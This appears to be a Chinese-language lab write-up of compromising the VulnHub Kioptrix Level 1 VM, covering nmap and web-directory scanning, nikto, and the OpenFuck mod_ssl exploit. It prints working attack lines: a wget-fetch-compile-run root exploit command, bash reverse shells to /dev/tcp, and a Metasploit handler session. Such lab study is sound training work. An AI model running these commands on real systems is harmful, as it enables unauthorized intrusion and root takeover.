# 1. 下载地址
https://www.vulnhub.com/entry/kioptrix-level-1-1,22/

# 2. 过程
## 2.1. 信息收集
1. nmap 收集信息
~~~shell
┌──(root㉿kali)-[/mytest/kioptrix11-22]
└─# nmap -n -v -sS -sV -O -p- -T5 -Pn 192.168.1.104
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-03 00:39 EDT
NSE: Loaded 45 scripts for scanning.
Initiating ARP Ping Scan at 00:39
Scanning 192.168.1.104 [1 port]
Completed ARP Ping Scan at 00:39, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 00:39
Scanning 192.168.1.104 [65535 ports]
Discovered open port 22/tcp on 192.168.1.104
Discovered open port 80/tcp on 192.168.1.104
Discovered open port 111/tcp on 192.168.1.104
Discovered open port 443/tcp on 192.168.1.104
Discovered open port 139/tcp on 192.168.1.104
Discovered open port 1024/tcp on 192.168.1.104
Completed SYN Stealth Scan at 00:39, 16.17s elapsed (65535 total ports)
Initiating Service scan at 00:39
Scanning 6 services on 192.168.1.104
Completed Service scan at 00:39, 11.03s elapsed (6 services on 1 host)
Initiating OS detection (try #1) against 192.168.1.104
NSE: Script scanning 192.168.1.104.
Initiating NSE at 00:39
Completed NSE at 00:39, 0.08s elapsed
Initiating NSE at 00:39
Completed NSE at 00:39, 0.04s elapsed
Nmap scan report for 192.168.1.104
Host is up (0.0012s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
1024/tcp open  status      1 (RPC #100024)
MAC Address: 00:0C:29:15:E0:CC (VMware)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Uptime guess: 0.043 days (since Mon May  2 23:37:07 2022)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=199 (Good luck!)
IP ID Sequence Generation: All zeros

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.04 seconds
           Raw packets sent: 66108 (2.909MB) | Rcvd: 65551 (2.623MB)
~~~

2. 初步浏览了一下页面，发现如下问题：
<img src="https://github.com/eagleatman/mywriteup/blob/main/images/1.png"  width="56%" />
<img src="https://github.com/eagleatman/mywriteup/blob/main/images/1.png" width="56%" />

<img src="https://github.com/eagleatman/mywriteup/blob/main/images/2.png"  width="56%;" />

去掉路径的具体文件名，只保留目录，发现存在目录遍历漏洞<br />
<img src="https://github.com/eagleatman/mywriteup/blob/main/images/3.png"  width="56%;" />

应该是开放了两个模块，mod_perl和mod_ssl

3. 有web应用，所以使用dirb、dirsearch、gobuster扫描一下目录信息
~~~shell
┌──(root㉿kali)-[/mytest/kioptrix11-22]
└─# dirb http://192.168.1.104 /usr/share/dirb/wordlists/common.txt -x /usr/share/dirb/wordlists/extensions_common.txt -o dirb.txt

-----------------
DIRB v2.22
By The Dark Raver
-----------------

OUTPUT_FILE: dirb.txt
START_TIME: Tue May  3 01:28:20 2022
URL_BASE: http://192.168.1.104/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
EXTENSIONS_FILE: /usr/share/dirb/wordlists/extensions_common.txt | ()(.asp)(.aspx)(.bat)(.c)(.cfm)(.cgi)(.com)(.dll)(.exe)(.htm)(.html)(.inc)(.jhtml)(.jsa)(.jsp)(.log)(.mdb)(.nsf)(.php)(.phtml)(.pl)(.reg)(.sh)(.shtml)(.sql)(.txt)(.xml)(/) [NUM = 29]

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.1.104/ ----
+ http://192.168.1.104/~operator (CODE:403|SIZE:273)
+ http://192.168.1.104/~operator/ (CODE:403|SIZE:274)
+ http://192.168.1.104/~root (CODE:403|SIZE:269)
+ http://192.168.1.104/~root/ (CODE:403|SIZE:270)
+ http://192.168.1.104/cgi-bin/ (CODE:403|SIZE:272)
+ http://192.168.1.104/cgi-bin/ (CODE:403|SIZE:272)
+ http://192.168.1.104/cgi-bin// (CODE:403|SIZE:273)
+ http://192.168.1.104/doc/ (CODE:403|SIZE:268)
+ http://192.168.1.104/icons/ (CODE:200|SIZE:9472)
+ http://192.168.1.104/index.html (CODE:200|SIZE:2890)
+ http://192.168.1.104/index.html (CODE:200|SIZE:2890)
==> DIRECTORY: http://192.168.1.104/manual/
+ http://192.168.1.104/manual/ (CODE:200|SIZE:643)
==> DIRECTORY: http://192.168.1.104/mrtg/
+ http://192.168.1.104/mrtg/ (CODE:200|SIZE:17318)
+ http://192.168.1.104/test.php (CODE:200|SIZE:27)
==> DIRECTORY: http://192.168.1.104/usage/
+ http://192.168.1.104/usage/ (CODE:200|SIZE:3704)

---- Entering directory: http://192.168.1.104/manual/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.1.104/mrtg/ ----
+ http://192.168.1.104/mrtg/contrib.html (CODE:200|SIZE:3322)
+ http://192.168.1.104/mrtg/faq.html (CODE:200|SIZE:6159)
+ http://192.168.1.104/mrtg/forum.html (CODE:200|SIZE:4342)
+ http://192.168.1.104/mrtg/index.html (CODE:200|SIZE:17318)
+ http://192.168.1.104/mrtg/index.html (CODE:200|SIZE:17318)
+ http://192.168.1.104/mrtg/logfile.html (CODE:200|SIZE:3659)
+ http://192.168.1.104/mrtg/mrtg.html (CODE:200|SIZE:7054)
+ http://192.168.1.104/mrtg/reference.html (CODE:200|SIZE:48684)

---- Entering directory: http://192.168.1.104/usage/ ----
+ http://192.168.1.104/usage/index.html (CODE:200|SIZE:3704)
+ http://192.168.1.104/usage/index.html (CODE:200|SIZE:3704)

-----------------
END_TIME: Tue May  3 01:48:48 2022
DOWNLOADED: 401244 - FOUND: 25

┌──(root㉿kali)-[/mytest/kioptrix11-22]
└─# cat dirb.txt | grep "CODE:200" > temp.txt
┌──(root㉿kali)-[/mytest/kioptrix11-22]
└─# cat -n temp.txt | grep "CODE:200"
     1	+ http://192.168.1.104/icons/ (CODE:200|SIZE:9472)
     2	+ http://192.168.1.104/index.html (CODE:200|SIZE:2890)
     3	+ http://192.168.1.104/index.html (CODE:200|SIZE:2890)
     4	+ http://192.168.1.104/manual/ (CODE:200|SIZE:643)
     5	+ http://192.168.1.104/mrtg/ (CODE:200|SIZE:17318)
     6	+ http://192.168.1.104/test.php (CODE:200|SIZE:27)
     7	+ http://192.168.1.104/usage/ (CODE:200|SIZE:3704)
     8	+ http://192.168.1.104/mrtg/contrib.html (CODE:200|SIZE:3322)
     9	+ http://192.168.1.104/mrtg/faq.html (CODE:200|SIZE:6159)
    10	+ http://192.168.1.104/mrtg/forum.html (CODE:200|SIZE:4342)
    11	+ http://192.168.1.104/mrtg/index.html (CODE:200|SIZE:17318)
    12	+ http://192.168.1.104/mrtg/index.html (CODE:200|SIZE:17318)
    13	+ http://192.168.1.104/mrtg/logfile.html (CODE:200|SIZE:3659)
    14	+ http://192.168.1.104/mrtg/mrtg.html (CODE:200|SIZE:7054)
    15	+ http://192.168.1.104/mrtg/reference.html (CODE:200|SIZE:48684)
    16	+ http://192.168.1.104/usage/index.html (CODE:200|SIZE:3704)
    17	+ http://192.168.1.104/usage/index.html (CODE:200|SIZE:3704)
┌──(root㉿kali)-[/mytest/kioptrix11-22]
└─# dirsearch -u http://192.168.1.104/ -w /usr/share/dirb/wordlists/common.txt -f .asp,.aspx,.bat,.c,.cfm,.cgi,.com,.dll,.exe,.htm,.html,.inc,.jhtml,.jsa,.jsp,.log,.mdb,.nsf,.php,.phtml,.pl,.reg,.sh,.shtml,.sql,.txt,.xml -o dirsearch.txt --proxy=http://192.168.1.5:8080/

  _|. _ _  _  _  _ _|_    v0.4.2.4
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 31989

Output File: /mytest/kioptrix11-22/dirsearch.txt

Target: http://192.168.1.104/

[03:20:57] Starting:
[03:20:58] 200 -    3KB - //
[03:20:59] 403 -  269B  - /.html
[03:21:00] 403 -  272B  - /.hta.php
[03:21:00] 403 -  269B  - /.hta/
[03:21:00] 403 -  273B  - /.hta.aspx
[03:21:00] 403 -  273B  - /.hta.html
[03:21:00] 403 -  272B  - /.hta.jsp
[03:21:00] 403 -  271B  - /.hta.js
[03:21:01] 403 -  277B  - /.htaccess.php
[03:21:01] 403 -  277B  - /.htaccess.jsp
[03:21:01] 403 -  278B  - /.htaccess.aspx
[03:21:01] 403 -  278B  - /.htaccess.html
[03:21:01] 403 -  276B  - /.htaccess.js
[03:21:01] 403 -  277B  - /.htpasswd.php
[03:21:01] 403 -  278B  - /.htpasswd.aspx
[03:21:01] 403 -  276B  - /.htpasswd.js
[03:21:01] 403 -  278B  - /.htpasswd.html
[03:21:01] 403 -  277B  - /.htpasswd.jsp
[03:21:23] 403 -  274B  - /~operator/
[03:21:23] 403 -  273B  - /~operator
[03:21:23] 403 -  270B  - /~root/
[03:21:24] 403 -  269B  - /~root
[03:23:34] 403 -  272B  - /cgi-bin/
[03:24:56] 403 -  268B  - /doc/
[03:26:44] 200 -    9KB - /icons/
[03:26:53] 200 -    3KB - /index.html
[03:28:02] 301 -  294B  - /manual  ->  http://127.0.0.1/manual/
[03:28:02] 200 -  643B  - /manual/
[03:28:28] 200 -   17KB - /mrtg/
[03:28:28] 301 -  292B  - /mrtg  ->  http://127.0.0.1/mrtg/
[03:32:40] 200 -   27B  - /test.php
[03:33:20] 301 -  293B  - /usage  ->  http://127.0.0.1/usage/
[03:33:20] 200 -    4KB - /usage/

Task Completed

┌──(root㉿kali)-[/mytest/kioptrix11-22]
└─# cat dirsearch.txt | grep 200
200     3KB  http://192.168.1.104:80//
200     9KB  http://192.168.1.104:80/icons/
200     3KB  http://192.168.1.104:80/index.html
200   643B   http://192.168.1.104:80/manual/
200    17KB  http://192.168.1.104:80/mrtg/
200    27B   http://192.168.1.104:80/test.php
200     4KB  http://192.168.1.104:80/usage/

┌──(root㉿kali)-[/mytest/kioptrix11-22]
└─# gobuster dir -u http://192.168.1.104 -t 1 -w /usr/share/wordlists/dirb/common.txt -x .php,.html,.txt,.zip -b 404,403 -o /mytest/kioptrix11-22/gobuster.txt

┌──(root㉿kali)-[/mytest/kioptrix11-22]
└─# gobuster dir -u http://192.168.1.104 -t 1 -w /usr/share/wordlists/dirb/common.txt -x .asp,.aspx,.bat,.c,.cfm,.cgi,.com,.dll,.exe,.htm,.html,.inc,.jhtml,.jsa,.jsp,.log,.mdb,.nsf,.php,.phtml,.pl,.reg,.sh,.shtml,.sql,.txt,.xml -o /mytest/kioptrix11-22/gobuster.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.104
[+] Method:                  GET
[+] Threads:                 1
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              inc,phtml,pl,reg,xml,aspx,htm,html,mdb,log,nsf,sql,dll,jsa,c,com,sh,shtml,bat,php,cgi,exe,jsp,txt,asp,cfm,jhtml
[+] Timeout:                 10s
===============================================================
2022/05/03 06:13:02 Starting gobuster in directory enumeration mode
===============================================================
/.hta.html            (Status: 403) [Size: 273]
/.hta                 (Status: 403) [Size: 268]
/.hta.com             (Status: 403) [Size: 272]
/.hta.bat             (Status: 403) [Size: 272]
/.hta.exe             (Status: 403) [Size: 272]
/.hta.xml             (Status: 403) [Size: 272]
/.hta.shtml           (Status: 403) [Size: 274]
/.hta.nsf             (Status: 403) [Size: 272]
/.hta.asp             (Status: 403) [Size: 272]
/.hta.cgi             (Status: 403) [Size: 272]
/.hta.txt             (Status: 403) [Size: 272]
/.hta.aspx            (Status: 403) [Size: 273]
/.hta.pl              (Status: 403) [Size: 271]
/.hta.dll             (Status: 403) [Size: 272]
/.hta.sh              (Status: 403) [Size: 271]
/.hta.cfm             (Status: 403) [Size: 272]
/.hta.jsp             (Status: 403) [Size: 272]
/.hta.htm             (Status: 403) [Size: 272]
/.hta.php             (Status: 403) [Size: 272]
/.hta.inc             (Status: 403) [Size: 272]
/.hta.log             (Status: 403) [Size: 272]
/.hta.c               (Status: 403) [Size: 270]
/.hta.reg             (Status: 403) [Size: 272]
/.hta.sql             (Status: 403) [Size: 272]
/.hta.jsa             (Status: 403) [Size: 272]
/.hta.jhtml           (Status: 403) [Size: 274]
/.hta.phtml           (Status: 403) [Size: 274]
/.hta.mdb             (Status: 403) [Size: 272]
/.htaccess.log        (Status: 403) [Size: 277]
/.htaccess.jsa        (Status: 403) [Size: 277]
/.htaccess.mdb        (Status: 403) [Size: 277]
/.htaccess.nsf        (Status: 403) [Size: 277]
/.htaccess.bat        (Status: 403) [Size: 277]
/.htaccess.aspx       (Status: 403) [Size: 278]
/.htaccess.c          (Status: 403) [Size: 275]
/.htaccess.asp        (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htaccess.jhtml      (Status: 403) [Size: 279]
/.htaccess.phtml      (Status: 403) [Size: 279]
/.htaccess.reg        (Status: 403) [Size: 277]
/.htaccess.cfm        (Status: 403) [Size: 277]
/.htaccess.shtml      (Status: 403) [Size: 279]
/.htaccess.inc        (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htaccess.cgi        (Status: 403) [Size: 277]
/.htaccess.exe        (Status: 403) [Size: 277]
/.htaccess.jsp        (Status: 403) [Size: 277]
/.htaccess.htm        (Status: 403) [Size: 277]
/.htaccess.xml        (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 273]
/.htaccess.pl         (Status: 403) [Size: 276]
/.htaccess.dll        (Status: 403) [Size: 277]
/.htaccess.sql        (Status: 403) [Size: 277]
/.htaccess.com        (Status: 403) [Size: 277]
/.htaccess.sh         (Status: 403) [Size: 276]
/.htpasswd.shtml      (Status: 403) [Size: 279]
/.htpasswd.bat        (Status: 403) [Size: 277]
/.htpasswd.cfm        (Status: 403) [Size: 277]
/.htpasswd.jsp        (Status: 403) [Size: 277]
/.htpasswd.sql        (Status: 403) [Size: 277]
/.htpasswd.exe        (Status: 403) [Size: 277]
/.htpasswd.reg        (Status: 403) [Size: 277]
/.htpasswd.htm        (Status: 403) [Size: 277]
/.htpasswd.pl         (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 273]
/.htpasswd.log        (Status: 403) [Size: 277]
/.htpasswd.asp        (Status: 403) [Size: 277]
/.htpasswd.inc        (Status: 403) [Size: 277]
/.htpasswd.aspx       (Status: 403) [Size: 278]
/.htpasswd.jsa        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htpasswd.nsf        (Status: 403) [Size: 277]
/.htpasswd.c          (Status: 403) [Size: 275]
/.htpasswd.com        (Status: 403) [Size: 277]
/.htpasswd.jhtml      (Status: 403) [Size: 279]
/.htpasswd.sh         (Status: 403) [Size: 276]
/.htpasswd.cgi        (Status: 403) [Size: 277]
/.htpasswd.mdb        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 278]
/.htpasswd.dll        (Status: 403) [Size: 277]
/.htpasswd.phtml      (Status: 403) [Size: 279]
/.htpasswd.xml        (Status: 403) [Size: 277]
/~operator            (Status: 403) [Size: 273]
/~root                (Status: 403) [Size: 269]
/cgi-bin/.htm         (Status: 403) [Size: 276]
/cgi-bin/.html        (Status: 403) [Size: 277]
/cgi-bin/             (Status: 403) [Size: 272]
/index.html           (Status: 200) [Size: 2890]
/index.html           (Status: 200) [Size: 2890]
/manual               (Status: 301) [Size: 294] [--> http://127.0.0.1/manual/]
/mrtg                 (Status: 301) [Size: 292] [--> http://127.0.0.1/mrtg/]
/test.php             (Status: 200) [Size: 27]
/usage                (Status: 301) [Size: 293] [--> http://127.0.0.1/usage/]

===============================================================
2022/05/03 06:19:37 Finished
===============================================================

┌──(root㉿kali)-[/mytest/kioptrix11-22]
└─# cat gobuster.txt | grep "Status: 200"
/index.html           (Status: 200) [Size: 2890]
/index.html           (Status: 200) [Size: 2890]
/test.php             (Status: 200) [Size: 27]

┌──(root㉿kali)-[/mytest/kioptrix11-22]
└─# cat gobuster.txt | grep "Status: 301"
/manual               (Status: 301) [Size: 294] [--> http://127.0.0.1/manual/]
/mrtg                 (Status: 301) [Size: 292] [--> http://127.0.0.1/mrtg/]
/usage                (Status: 301) [Size: 293] [--> http://127.0.0.1/usage/]
~~~
**虽然扫描出来的目录没有发现特别有用的信息，但是就当熟悉工具吧，dirb不能用-e而要用-f(这需要注意：dirsearch默认只会替换字典中%EXT%为指定的extensions 如-e php  Wishlist.%EXT%-->Wishlist.php)**
**
-e的意思是：
admin
admin.%EXT%
index.html
home.php
test.jsp

变为：
admin
admin.asp
admin.aspx
admin.htm
admin.js
index.html
**
4. 最后扫描一下web漏洞
~~~shell
┌──(root㉿kali)-[/mytest/kioptrix11-22]
└─# nikto -host 192.168.1.104 -o nikto2.txt
┌──(root㉿kali)-[/mytest/kioptrix11-22]
└─# cat nikto.txt
- Nikto v2.1.6/2.1.5
+ Target Host: 192.168.1.104
+ Target Port: 80
+ GET Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Wed Sep  5 23:12:46 2001
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ OSVDB-27487: GET Apache is vulnerable to XSS via the Expect header
+ HEAD mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)
+ HEAD Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ HEAD OpenSSL/0.9.6b appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.
+ OSVDB-838: GET Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.
+ OSVDB-4552: GET Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.
+ OSVDB-2733: GET Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.
+ GET mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. CVE-2002-0082, OSVDB-756.
+ OPTIONS Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE
+ OSVDB-877: TRACE HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ GET ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
+ OSVDB-682: GET /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS).
+ OSVDB-3268: GET /manual/: Directory indexing found.
+ OSVDB-3092: GET /manual/: Web server manual found.
+ OSVDB-3268: GET /icons/: Directory indexing found.
+ OSVDB-3233: GET /icons/README: Apache default file found.
+ OSVDB-3092: GET /test.php: This might be interesting...
+ GET /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ GET /wordpresswp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ GET /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ GET /wordpresswp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ GET /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ GET /wordpresswp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ GET /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.
+ GET /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.
+ GET /shell?cat+/etc/hosts: A backdoor was identified.
~~~
比较有用的wp的漏洞，访问了一下，才发现不能访问。
5. 最后看了一下网上的思路，试了一下mod_ssl：
~~~shell
┌──(root㉿kali)-[/mytest/kioptrix11-22]
└─# searchsploit mod_ssl
--------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                     |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache mod_ssl 2.0.x - Remote Denial of Service                                                                                                    | linux/dos/24590.txt
Apache mod_ssl 2.8.x - Off-by-One HTAccess Buffer Overflow                                                                                         | multiple/dos/21575.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                                                               | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                                                         | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                                                         | unix/remote/47080.c
Apache mod_ssl OpenSSL < 0.9.6d / < 0.9.7-beta2 - 'openssl-too-open.c' SSL2 KEY_ARG Overflow                                                       | unix/remote/40347.txt
--------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(root㉿kali)-[/mytest/kioptrix11-22]
└─# searchsploit 47080.c -p
  Exploit: Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)
      URL: https://www.exploit-db.com/exploits/47080
     Path: /usr/share/exploitdb/exploits/unix/remote/47080.c
File Type: C source, ASCII text

┌──(root㉿kali)-[/mytest/kioptrix11-22]
└─# gcc -o OpenFuck 47080.c -lcrypto
┌──(root㉿kali)-[/mytest/kioptrix11-22]
└─# ./OpenFuck 0x6b 192.168.1.104 443 -c 41

*******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 41 of 41
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8258
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$
o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmod.c; ./exploit; -kmod.c; gcc -
--07:18:15--  http://192.168.1.5/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to 192.168.1.5:80... connected!
HTTP request sent, awaiting response... 200 OK
Length: 3,921 [text/plain]

    0K ...                                                   100% @   3.74 MB/s

07:18:15 (957.28 KB/s) - `ptrace-kmod.c' saved [3921/3921]

/usr/bin/ld: cannot open output file exploit: Permission denied
collect2: ld returned 1 exit status
gcc: file path prefix `/usr/bin' never used

id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)

bash -c 'exec bash -i &>/dev/tcp/192.168.1.7/444 <&1'
bash: connect: Connection refused
bash: /dev/tcp/192.168.1.7/444: Connection refused

id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
bash -c 'exec bash -i &>/dev/tcp/192.168.1.7/4444 <&1'

服务器端：
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (linux/x86/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   CMD    /bin/sh          yes       The command string to execute
   LHOST  192.168.1.7      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > jobs

Jobs
====

  Id  Name                    Payload                      Payload opts
  --  ----                    -------                      ------------
  2   Exploit: multi/handler  linux/x86/shell_reverse_tcp  tcp://192.168.1.7:4444

msf6 exploit(multi/handler) > 
[*] Command shell session 3 opened (192.168.1.7:4444 -> 192.168.1.104:1032 ) at 2022-05-03 07:22:45 -0400
msf6 exploit(multi/handler) > sessions -l

Active sessions
===============

  Id  Name  Type             Information                                             Connection
  --  ----  ----             -----------                                             ----------
  3         shell x86/linux  Shell Banner: bash: no job control in this shell -----  192.168.1.7:4444 -> 192.168.1.104:1032  (192.168.1.104)

msf6 exploit(multi/handler) > sessions -i 3
[*] Starting interaction with 3...


Shell Banner:
bash: no job control in this shell
-----


[root@kioptrix tmp]# find / -name ifconfig
find / -name ifconfig
/sbin/ifconfig
[root@kioptrix tmp]# /sbin/ifconfig
/sbin/ifconfig
eth0      Link encap:Ethernet  HWaddr 00:0C:29:15:E0:CC
          inet addr:192.168.1.104  Bcast:192.168.1.255  Mask:255.255.255.0
          UP BROADCAST NOTRAILERS RUNNING  MTU:1500  Metric:1
          RX packets:3125250 errors:70 dropped:72 overruns:0 frame:0
          TX packets:2988321 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:100
          RX bytes:292009089 (278.4 Mb)  TX bytes:503363549 (480.0 Mb)
          Interrupt:11 Base address:0x2000

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:10 errors:0 dropped:0 overruns:0 frame:0
          TX packets:10 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:706 (706.0 b)  TX bytes:706 (706.0 b)

[root@kioptrix tmp]# passwd root
passwd root
New password: 123456
BAD PASSWORD: it is too simplistic/systematic
Retype new password: 123456
Changing password for user root
passwd: all authentication tokens updated successfully
[root@kioptrix tmp]#
~~~~
**这里需要注意的是:**
有可能目标服务器无法访问： ```https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c```，解决办法是自己修改payload，并搭建中转站。
~~~shell
┌──(root㉿kali)-[/mytest/kioptrix11-22]
└─# cat /usr/share/exploitdb/exploits/unix/remote/47080.c | grep wget
 * Note: if required, host ptrace and replace wget target
#define COMMAND2 "unset HISTFILE; cd /tmp; wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmod.c; ./exploit; \n"

┌──(root㉿kali)-[/mytest/kioptrix11-22]
└─# cat 47080.c | grep wget
 * Note: if required, host ptrace and replace wget target
#define COMMAND2 "unset HISTFILE; cd /tmp; wget http://192.168.1.5/ptrace-kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmod.c; ./exploit; \n"
~~~



# 3. 遗留
命令行ssh登录出现如下提示，但是用secureCRT确是可以正常登录的，考虑有可能是ssh客户端的某些算法不支持，google了一下仍然没有解决。
~~~shell
┌──(root㉿kali)-[/mytest/kioptrix11-22]
└─# ssh root@192.168.1.104
Unable to negotiate with 192.168.1.104 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
~~~
<img src="https://github.com/eagleatman/mywriteup/blob/main/images/4.png"  width="56%;" />
**我相信还有别的思路**
# 4. 说明
